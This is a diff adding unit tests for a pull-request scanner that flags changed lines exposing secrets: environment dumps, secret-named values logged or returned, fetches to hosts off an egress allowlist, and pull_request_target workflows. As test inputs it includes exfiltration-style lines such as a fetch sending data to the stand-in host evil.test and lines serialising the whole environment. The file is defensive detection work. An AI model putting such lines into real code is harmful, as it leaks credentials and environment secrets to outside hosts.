@@ -19,6 +19,7 @@ import feedback  # noqa: E402
 import freshness  # noqa: E402
 import handoffs  # noqa: E402
 import kblib  # noqa: E402
+import secrets_touch  # noqa: E402
 
 SAFE = "### Public-safe\n\n- [X] I removed API keys, account and workspace IDs, names, domains, emails, IP addresses and secrets.\n"
 
@@ -506,6 +507,77 @@ class AutoMergeTests(unittest.TestCase):
         (root / ".claude").mkdir()
         (root / ".claude" / "kb-capture.toml").write_text('auto_merge = "on"\nauto_merge_paths = ["docs/*.md"]\n')
         self.assertEqual(auto_merge.load_config(root), {"on": True, "paths": ["docs/*.md"], "deny": []})
+
+
+class SecretsTouchTests(unittest.TestCase):
+    """Decision 0016, step 6: which changed lines the owner is asked to read."""
+
+    CFG = {"allow": secrets_touch.DEFAULT_ALLOW + ["api.github.com", "*.workers.dev"],
+           "ignore": secrets_touch.DEFAULT_IGNORE}
+
+    def flags(self, line, path="src/index.ts"):
+        return secrets_touch.scan_line(path, line, self.CFG["allow"])
+
+    def test_whole_environment(self):
+        for line in ["return new Response(JSON.stringify(env));", "console.log(process.env)",
+                     "dict(os.environ)", "  run: printenv | sort", "Get-ChildItem env:",
+                     "with: ${{ toJSON(secrets) }}", "const all = { ...env };", "secrets: inherit"]:
+            self.assertTrue(any("whole environment" in m for m in self.flags(line)), line)
+        for line in ["const key = env.API_KEY;", "os.environ.get('HOME')", "process.env.NODE_ENV",
+                     "os.environ['PATH'] = p", "const environment = 'prod';"]:
+            self.assertFalse(any("whole environment" in m for m in self.flags(line)), line)
+
+    def test_secret_on_a_log_or_response(self):
+        for line in ["console.log(env.API_KEY)", "return env.XAI_API_KEY", "print(api_key)",
+                     "res.json({ token: authToken })", "logger.info(f'secret={s}')"]:
+            self.assertTrue(any("secret-named" in m for m in self.flags(line)), line)
+        for line in ["print(usage.max_tokens)", "return tokens", "console.log('started')"]:
+            self.assertFalse(any("secret-named" in m for m in self.flags(line)), line)
+
+    def test_egress(self):
+        self.assertIn("names host `evil.test`, which isn't on the egress allowlist",
+                      self.flags("await fetch('https://evil.test/x', {body: k})"))
+        for line in ["fetch('https://api.github.com/repos')", "url = 'https://app.workers.dev/'",
+                     "see http://localhost:8787", "// https://evil.test in a comment"]:
+            self.assertEqual(self.flags(line), [], line)
+        self.assertTrue(any("built at runtime" in m for m in self.flags("await fetch(target, init)")))
+        self.assertTrue(any("built at runtime" in m for m in self.flags("requests.post(url, json=d)")))
+
+    def test_pull_request_target(self):
+        self.assertTrue(self.flags("  pull_request_target:", path=".github/workflows/x.yml"))
+        self.assertEqual(self.flags("  pull_request_target:", path="docs/notes.txt"), [])
+
+    def test_scan_reads_head_and_skips_prose(self):
+        diff = "\n".join([
+            "diff --git a/src/a.ts b/src/a.ts", "--- a/src/a.ts", "+++ b/src/a.ts",
+            "@@ -3,0 +4,2 @@", "+const x = 1;", "+console.log(JSON.stringify(env));",
+            "diff --git a/README.md b/README.md", "--- a/README.md", "+++ b/README.md",
+            "@@ -1 +1 @@", "+curl https://evil.test",
+            "diff --git a/old.ts b/old.ts", "--- a/old.ts", "+++ /dev/null", "@@ -1 +0,0 @@",
+            "diff --git a/.github/workflows/d.yml b/.github/workflows/d.yml",
+            "--- a/.github/workflows/d.yml", "+++ b/.github/workflows/d.yml", "@@ -9,0 +10 @@",
+            "+          name: deploy",
+        ])
+        heads = {"src/a.ts": "import x\nconst k = env.GROK_API_KEY;\n",
+                 ".github/workflows/d.yml": "env:\n  T: ${{ secrets.GITHUB_TOKEN }}\n  C: ${{ secrets.CF_API_TOKEN }}\n"}
+        found = secrets_touch.scan(secrets_touch.parse_diff(diff), heads.get, self.CFG)
+        self.assertEqual([(p, n) for p, n, _ in found],
+                         [(".github/workflows/d.yml", 3), ("src/a.ts", 2), ("src/a.ts", 5)])
+        self.assertIn("CF_API_TOKEN", found[0][2])
+
+    def test_markdown_comment(self):
+        self.assertEqual(secrets_touch.markdown([], "o/r", "abc"), "")
+        md = secrets_touch.markdown([("a|b.ts", 3, "x")], "o/r", "abc")
+        self.assertTrue(md.startswith(secrets_touch.MARKER))
+        self.assertIn("[`a\\|b.ts:3`](https://github.com/o/r/blob/abc/a|b.ts#L3)", md)
+        self.assertIn("1 place to read", md)
+
+    def test_host_allowlist(self):
+        allow = ["api.example.dev", "*.workers.dev"]
+        self.assertTrue(secrets_touch.host_allowed("API.example.dev", allow))
+        self.assertTrue(secrets_touch.host_allowed("a.b.workers.dev", allow))
+        self.assertFalse(secrets_touch.host_allowed("workers.dev.evil.test", allow))
+        self.assertFalse(secrets_touch.host_allowed("notapi.example.dev", allow))
 
 
 class AnchorTests(unittest.TestCase):
